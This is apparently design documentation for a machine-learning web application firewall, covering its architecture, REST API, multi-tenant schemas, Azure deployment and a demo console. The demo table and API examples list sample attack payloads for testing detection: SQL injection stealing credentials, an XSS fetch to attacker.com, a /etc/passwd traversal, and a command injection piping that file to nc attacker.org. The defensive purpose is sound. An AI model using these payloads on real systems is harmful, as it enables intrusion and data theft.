# WireFall-as-a-Service — Production Cloud Platform Documentation

## Executive Summary & Overview
WireFall is a self-learning Web Application Firewall (WAF) platform powered by a Transformer-based Masked Language Model (DistilBERT) and an Ensemble Anomaly Detector. WireFall inspects incoming HTTP traffic in real-time, detecting and blocking zero-day vulnerabilities and anomalous traffic without relying strictly on static signature databases. Novel payload anomalies trigger an automated LLM-driven rule generation pipeline (DistilGPT2) that dynamically creates regex block rules pushed to an in-memory fast-path filter (Redis).

This document outlines the system architecture, Low-Level Design (LLD), RESTful API specifications, multi-tenant data schemas, and deployment guides to scale WireFall into an enterprise-grade "WireFall-as-a-Service" cloud platform.

---

## 1. System Design & Codebase Analysis

### 1.1 Existing Component Mapping

```
+-----------------------------------------------------------------------------------+
|                              WireFall Core Engine                                 |
+-----------------------------------+-----------------------------------------------+
|  OpenResty Reverse Proxy (Lua)    |  FastAPI WAF Engine & ML Inference            |
|  - waf_chain.lua                  |  - api/main.py & inference/*                  |
|  - Stage 1: Redis Fast Regex      |  - DistilBERT MLM (5-pass feature extraction) |
|  - Stage 2: Deep ML Forwarding    |  - Ensemble Anomaly Classifier                |
|                                   |  - DistilGPT2 Auto Regex Generator            |
+-----------------------------------+-----------------------------------------------+
|  Logs Microservice (FastAPI)      |  Data Persistence Layer                       |
|  - api/logs_service.py            |  - Redis 7+ (WAF modes, fast rules, cache)    |
|  - CRUD & Aggregate Statistics    |  - MongoDB 7+ (Persistent analysis logs)      |
+-----------------------------------+-----------------------------------------------+
```

| Component | Modules / Path | Technical Function |
|---|---|---|
| **Reverse Proxy (Stage 1)** | `lua/waf_chain.lua` | OpenResty/Nginx Lua hook. Evaluates URI/body against Redis fast-path regex rules in microseconds. If unknown, proxies to Stage 2. |
| **WAF Backend API** | `api/main.py`, `api/routes/` | Central control plane & synchronous analysis endpoint (`/analyze`). Manages WAF operational modes (`off`, `fast`, `full`), regex blocklists, and whitelisting. |
| **Transformer Model** | `inference/model.py`, `features.py` | Fine-tuned `DistilBertForMaskedLM`. Runs 5 passes with 15% random token masking per HTTP sequence to extract reconstruction loss, CLS embedding, and perplexity. |
| **Ensemble Classifier** | `inference/ensemble.py` | Majority voting (>=2/3) across 3 algorithms: (1) Isolation Forest anomaly score, (2) Statistical Z-score (> 7.0 sigma), (3) 95th percentile reconstruction loss threshold. |
| **Rule Generator** | `inference/rule_generator.py` | LLM rule generator (`Qwen/Qwen2.5-0.5B-Instruct` with `distilgpt2` fallback) that creates precise regex patterns for novel blocked payloads and writes them directly to Redis (`waf:rules:regex`). |
| **Logs Microservice** | `api/logs_service.py` | Dedicated CRUD microservice for querying analysis history, tenant stats, and recent detections from MongoDB. |
| **Async Queue Worker** | `api/services/queue_worker.py` | Redis Streams background worker processing heavy ML feature evaluation, MongoDB persistence, and WebSocket broadcasting asynchronously. |
| **Real-Time Stream** | `api/services/ws_manager.py` | WebSocket manager broadcasting live telemetry to client dashboards. |

---

### 1.2 Low-Level Design (LLD) — Distributed Multi-Tenant Architecture

To transform WireFall into a multi-tenant cloud service ("WireFall-as-a-Service"), the architecture is decoupled into stateless micro-tiers connected via an asynchronous event bus and tenant-isolated data partitions.

```
+---------------------------------------------------------------------------------------------------+
|                                  Client Ingress / Edge Tier                                       |
|  [ Customer Web Applications ] ---> [ Cloud Load Balancer / API Gateway ]                         |
+---------------------------------------------------------------------------------------------------+
                                                 |
                                                 v
+---------------------------------------------------------------------------------------------------+
|                                 Stage 1: Fast-Path Filter Pool                                    |
|  +-----------------------------+  +-----------------------------+  +---------------------------+  |
|  | OpenResty Node 1 (Lua WAF)  |  | OpenResty Node 2 (Lua WAF)  |  | OpenResty Node N (Lua WAF)|  |
|  +-----------------------------+  +-----------------------------+  +---------------------------+  |
|                 | (Cache Hit: Block)             | (Cache Miss: Forward)                          |
|                 v                                v                                                |
|       [ Immediate 403 Response ]         [ Request Stream / Queue ]                               |
+---------------------------------------------------------------------------------------------------+
                                                 |
                                                 v
+---------------------------------------------------------------------------------------------------+
|                                Stage 2: Distributed ML Pipeline                                   |
|  +---------------------------------------------------------------------------------------------+  |
|  | Message Broker (RabbitMQ / Redis Streams / Apache Kafka)                                    |  |
|  +---------------------------------------------------------------------------------------------+  |
|                 |                                              |                                  |
|                 v                                              v                                  |
|  +-----------------------------+                +-----------------------------+                   |
|  | ML Inference Worker 1       |                | ML Inference Worker N       |                   |
|  | - DistilBERT Feature Extractor              | - DistilBERT Feature Extractor                  |
|  | - Isolation Forest & Ensemble                | - Isolation Forest & Ensemble                   |
|  +-----------------------------+                +-----------------------------+                   |
|                 |                                              |                                  |
|                 +-----------------------+----------------------+                                  |
|                                         |                                                         |
|                                         v                                                         |
|                         +-----------------------------------+                                     |
|                         | Auto Rule Generator (DistilGPT2)  |                                     |
|                         +-----------------------------------+                                     |
+---------------------------------------------------------------------------------------------------+
                                                 |
                                                 v
+---------------------------------------------------------------------------------------------------+
|                               Multi-Tenant State & Telemetry Layer                                |
|  +-------------------------------------+     +-------------------------------------------------+  |
|  | Tenant-Scoped Redis Cluster          |     | Scalable Log Database (MongoDB / PostgreSQL)    |  |
|  | - Key: tenant:{id}:rules            |     | - Collection: tenant_logs                       |  |
|  | - Key: tenant:{id}:mode             |     | - Indexed by tenant_id, timestamp, is_malicious |  |
|  +-------------------------------------+     +-------------------------------------------------+  |
+---------------------------------------------------------------------------------------------------+
                                                 |
                                                 v
+---------------------------------------------------------------------------------------------------+
|                                   Control Plane & Dashboard UI                                    |
|  [ SaaS Management Portal ] <--- (REST APIs / WebSocket Gateway) ---> [ Live Analytics UI ]       |
+---------------------------------------------------------------------------------------------------+
```

#### Key Architecture Principles for Multi-Tenancy:
1. **Tenant Context Propagation**: Every request carries an `X-Tenant-ID` header or API token.
2. **Tenant Isolation**:
   - Fast-path regex rules stored in Redis keys matching `tenant:{tenant_id}:rules`.
   - WAF operational mode stored in `tenant:{tenant_id}:mode`.
   - Database queries filtered rigidly by `tenant_id`.
3. **Asynchronous Deep Path**: High-throughput web traffic passes through OpenResty. Fast-path regex matches are blocked instantly (microsecond latency). Unmatched traffic is analyzed asynchronously via message queues, updating tenant rule sets dynamically without blocking user traffic loops.

---

### 1.3 End-to-End Data Flow & Process Execution

```
[ Client Request ] 
       |
       v
+-------------------------------------------------------------+
| Step 1: Ingress & Fast Path (OpenResty + Redis)            |
| - Parse tenant_id from header/host                          |
| - Fetch WAF mode (off/fast/full) for tenant                 |
| - Match path & body against Redis key `tenant:{id}:rules`   |
+-------------------------------------------------------------+
       |                                   |
 (Rule Match: Block)                 (No Match: Full Mode)
       |                                   |
       v                                   v
[ 403 Forbidden Response ]      +-------------------------------------------------------+
                                | Step 2: Sequence Builder                              |
                                | Build CLS/SEP token format:                           |
                                | [CLS] <body_bytes> ... </body_bytes> [SEP]            |
                                | <request_method> ... </request_method> [SEP]          |
                                | <request_path> ... </request_path> [SEP]              |
                                | <request_protocol> ... </request_protocol> [SEP]      |
                                | <request_body> ... </request_body> [SEP]              |
                                +-------------------------------------------------------+
                                                           |
                                                           v
                                +-------------------------------------------------------+
                                | Step 3: Masked DistilBERT Feature Extraction           |
                                | Run N=5 passes with 15% token masking                 |
                                | Compute:                                              |
                                | - Reconstruction Loss (MSE)                           |
                                | - [CLS] Embedding Vector (768-dim)                    |
                                | - Perplexity exp(loss)                                |
                                +-------------------------------------------------------+
                                                           |
                                                           v
                                +-------------------------------------------------------+
                                | Step 4: Ensemble Anomaly Voting                       |
                                | Vote 1: IsolationForest(scaled_features)              |
                                | Vote 2: Z-Score(loss) > 7.0                           |
                                | Vote 3: Loss > 95th Percentile Baseline               |
                                | Malicious if Votes >= 2                               |
                                +-------------------------------------------------------+
                                           |                         |
                                     (If Malicious)             (If Benign)
                                           |                         |
                                           v                         v
                                +-----------------------+   +-------------------+
                                | Step 5: Auto-Rule Gen |   | Forward to Origin |
                                | DistilGPT2 LLM builds |   | Return 200 OK     |
                                | regex pattern -> Redis|   +-------------------+
                                +-----------------------+
                                           |
                                           v
                                +-------------------------------------------------------+
                                | Step 6: Log & Stream Telemetry                        |
                                | Write event to MongoDB & publish to WebSocket/Kafka   |
                                +-------------------------------------------------------+
```

---

## 2. RESTful API Specification

### 2.1 Multi-Tenant Core WAF API

| Method | Path | Description | Headers | Request Body | Response (200 OK) |
|---|---|---|---|---|---|
| `POST` | `/api/v1/analyze` | Inspect HTTP request payload for anomalies | `X-Tenant-ID: string` | `{"method": "POST", "path": "/login", "protocol": "HTTP/1.1", "request_body": "' OR '1'='1"}` | `{"allow": false, "reason": "Blocked by transformer model", "auto_learned_rule": "' OR '1'='1"}` |
| `GET` | `/api/v1/health` | Service health status | None | None | `{"status": "healthy", "redis": true, "mongodb": true, "model_loaded": true}` |
| `GET` | `/api/v1/rules` | Fetch regex rules for tenant | `X-Tenant-ID: string` | None | `{"tenant_id": "t-100", "rules": ["(?i)select.*from", "(?i)<script>"]}` |
| `POST` | `/api/v1/rules` | Add custom regex rule | `X-Tenant-ID: string` | `{"rule": "(?i)union.*select"}` | `{"status": "success", "rule": "(?i)union.*select"}` |
| `DELETE` | `/api/v1/rules` | Remove a regex rule | `X-Tenant-ID: string` | `{"rule": "(?i)union.*select"}` | `{"status": "success", "deleted": true}` |
| `POST` | `/api/v1/set-mode/{mode}` | Set tenant WAF mode (`off`, `fast`, `full`) | `X-Tenant-ID: string` | None | `{"tenant_id": "t-100", "mode": "full"}` |
| `POST` | `/api/v1/pass-request` | Add exception / whitelist rule | `X-Tenant-ID: string` | `{"path": "/health"}` | `{"status": "success", "whitelisted": "/health"}` |
| `WS` | `/api/v1/ws/logs` | Real-time WebSocket log stream | `Query: tenant_id=t-100` | N/A | Streaming JSON log events |

### 2.2 Telemetry & Analytics Service API (Port 8002)

| Method | Path | Description | Query Parameters | Response |
|---|---|---|---|---|
| `GET` | `/api/v1/logs` | Query paginated attack logs | `tenant_id`, `limit` (default 50), `skip` (default 0) | `{"logs": [...], "total": 1240, "has_more": true}` |
| `GET` | `/api/v1/logs/stats` | Aggregated threat metrics | `tenant_id` | `{"total": 1240, "malicious": 142, "benign": 1098, "detection_rate": 11.45}` |
| `GET` | `/api/v1/logs/recent` | Recent live attack triggers | `tenant_id`, `limit` (default 10) | `{"logs": [...]}` |
| `DELETE` | `/api/v1/logs` | Flush tenant logs | `tenant_id` | `{"status": "success", "deleted_count": 1240}` |

---

## 3. Multi-Tenant Data Schema

### 3.1 MongoDB Data Models

#### 1. Tenant Registry (`tenants` collection)
```json
{
  "_id": "ObjectId('65cf10000000000000000001')",
  "tenant_id": "tenant-expedia-01",
  "name": "Expedia Group Flight Service",
  "created_at": "2026-08-12T21:00:00Z",
  "plan": "enterprise",
  "waf_mode": "full",
  "settings": {
    "mask_prob": 0.15,
    "z_score_threshold": 7.0,
    "auto_rule_generation": true
  }
}
```

#### 2. Analysis Telemetry (`analysis_logs` collection)
```json
{
  "_id": "ObjectId('65cf10000000000000000002')",
  "tenant_id": "tenant-expedia-01",
  "timestamp": "2026-08-12T21:54:00Z",
  "request": {
    "method": "POST",
    "path": "/api/v1/booking/search",
    "protocol": "HTTP/1.1",
    "request_body": "destination=NYC' UNION SELECT 1,2,3--",
    "client_ip": "198.51.100.45",
    "user_agent": "Mozilla/5.0"
  },
  "analysis": {
    "is_malicious": true,
    "reconstruction_loss": 0.8421,
    "perplexity": 2.3212,
    "details": {
      "if_anomaly": true,
      "z_score": 12.45,
      "percentile_anomaly": true,
      "votes": 3
    }
  },
  "action_taken": "BLOCK",
  "auto_learned_rule": "(?i)union.*select"
}
```

### 3.2 Redis Key Schema (In-Memory Fast Path & Cache)

| Key Pattern | Data Type | Purpose | TTL / Expiration |
|---|---|---|---|
| `tenant:{tenant_id}:mode` | String | Active WAF operational mode (`off`, `fast`, `full`) | Persistent |
| `tenant:{tenant_id}:rules` | Set | Active regex pattern blocklist for Stage 1 fast path | Persistent |
| `tenant:{tenant_id}:whitelist` | Set | Bypassed request paths / IPs | Persistent |
| `tenant:{tenant_id}:metrics:counter` | Hash | Real-time counters for blocked vs allowed requests | 24 Hours |

---

## 4. Multi-Container Infrastructure & Cloud Automation (IaC)

### 4.1 Decoupled Microservice Architecture

WireFall is deployed as a decoupled multi-container microservice network isolated inside a custom bridge network (`wirefall_net`):

```
+----------------------------------------------------------------------------------------------------+
|                                    Multi-Container Network                                         |
|  +--------------------+     +-------------------+     +---------------------+                      |
|  |  openresty Proxy   | --> |   wirefall-api    | --> |       redis         |                      |
|  |  Port 80           |     |   Port 8001       |     |  WAF State & Cache  |                      |
|  +--------------------+     +-------------------+     +---------------------+                      |
|                                       |                          |                                 |
|                                       v                          v                                 |
|                             +-------------------+     +---------------------+                      |
|                             |   wirefall-logs   |     |   wirefall-worker   |                      |
|                             |   Port 8002       |     | Async Queue Worker  |                      |
|                             +-------------------+     +---------------------+                      |
|                                       |                          |                                 |
|                                       +------------+-------------+                                 |
|                                                    |                                               |
|                                                    v                                               |
|                                         +--------------------+                                     |
|                                         |       mongo        |                                     |
|                                         |   Persistent DB    |                                     |
|                                         +--------------------+                                     |
+----------------------------------------------------------------------------------------------------+
```

### 4.2 Azure Terraform Deployment Guide ($100 Student Credits)

The Terraform module in `infrastructure/terraform/azure/` provisions:
- **Resource Group**: `rg-wirefall-prod`
- **Virtual Network & Subnet**: `vnet-wirefall` / `snet-wirefall-app`
- **Network Security Group**: Ingress rules for HTTP (80), HTTPS (443), WAF API (8001), Logs API (8002), SSH (22)
- **Linux VM**: Azure `Standard_B2s` (2 vCPUs, 4GB RAM — optimized performance for $100 student credit budget) running Ubuntu 22.04 LTS and executing `cloud-init.sh`.

#### Deployment Steps:
1. Login to Azure CLI:
   ```bash
   az login
   ```
2. Deploy via Terraform:
   ```bash
   cd infrastructure/terraform/azure
   cp terraform.tfvars.example terraform.tfvars
   
   terraform init
   terraform apply -auto-approve
   ```

---

## 5. Playable "Hacker Mode" Exploit Demo Guide

### 5.1 Overview
The **Hacker Mode Sandbox** (`dashboard/static/hacker.html`) is an interactive security testing console built for interviewers and engineers to evaluate WireFall's real-time detection pipeline against live exploit payloads.

### 5.2 Launching the Demo
1. Start the local containerized environment:
   ```bash
   docker compose -f infrastructure/docker-compose.yml up -d
   ```
2. Open your web browser to:
   `http://localhost/dashboard/hacker.html` or `http://localhost:8080/hacker.html`

### 5.3 Interactive Exploit Test Scenarios

| Button | Exploit Vector | Sample Payload | Expected Result |
|---|---|---|---|
| **SQL Injection** | SQLi Database Exfiltration | `' UNION SELECT 1, username, password FROM users--` | `BLOCKED 403` — Loss > 0.45, 3/3 Ensemble Votes, Auto-Rule Generated |
| **XSS Payload** | Cross-Site Scripting | `<script>fetch('http://attacker.com/steal')</script>` | `BLOCKED 403` — Loss > 0.40, 3/3 Ensemble Votes, Auto-Rule Generated |
| **Path Traversal** | Local File Inclusion | `../../../../../../etc/passwd` | `BLOCKED 403` — Loss > 0.50, 3/3 Ensemble Votes, Auto-Rule Generated |
| **Command Injection** | Remote Code Execution | `; cat /etc/passwd | nc attacker.org 1337` | `BLOCKED 403` — Loss > 0.55, 3/3 Ensemble Votes, Auto-Rule Generated |
| **Custom Payload** | Custom Attack Tester | User-defined payload input box | Evaluated live against DistilBERT MLM & Ensemble |

---
